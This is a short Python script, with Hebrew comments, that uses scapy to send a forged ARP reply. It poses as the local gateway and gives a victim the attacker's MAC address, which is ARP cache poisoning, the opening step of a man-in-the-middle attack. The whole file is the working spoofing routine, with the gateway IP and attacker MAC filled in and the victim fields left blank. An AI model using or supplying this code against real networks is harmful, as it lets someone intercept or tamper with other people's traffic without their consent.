import scapy.all as scapy

def send_arp_spoof(gateway_ip, victim_ip, victim_mac, attacker_mac):
 
    arp_response = scapy.ARP(
        op=2,                 # תגובת ARP
        psrc=gateway_ip,      # מתחזים לראוטר
        hwsrc=attacker_mac,   # כתובת MAC שלך (המחשב התוקף)
        pdst=victim_ip,       # למי שולחים (הקורבן)
        hwdst=victim_mac      # כתובת MAC של הקורבן
    )
   
    scapy.send(arp_response, verbose=False)


send_arp_spoof(
    gateway_ip="192.168.1.243",
    victim_ip="",
    victim_mac="",
    attacker_mac="ed:b0:c5:c0:b5:06"
)
